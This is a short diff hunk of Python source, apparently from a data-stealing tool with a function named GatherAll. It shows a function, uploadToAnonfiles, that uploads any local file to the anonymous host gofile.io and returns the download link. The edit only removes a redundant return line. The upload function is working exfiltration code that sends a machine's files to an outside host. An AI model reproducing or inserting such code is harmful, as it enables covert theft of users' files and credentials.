@@ -919,7 +919,6 @@ def GatherAll():
 def uploadToAnonfiles(path):
     try:return requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path, 'rb')}).json()["data"]["downloadPage"]
     except:return False
-    return False
 
 # def uploadToAnonfiles(path):s
 #     try:
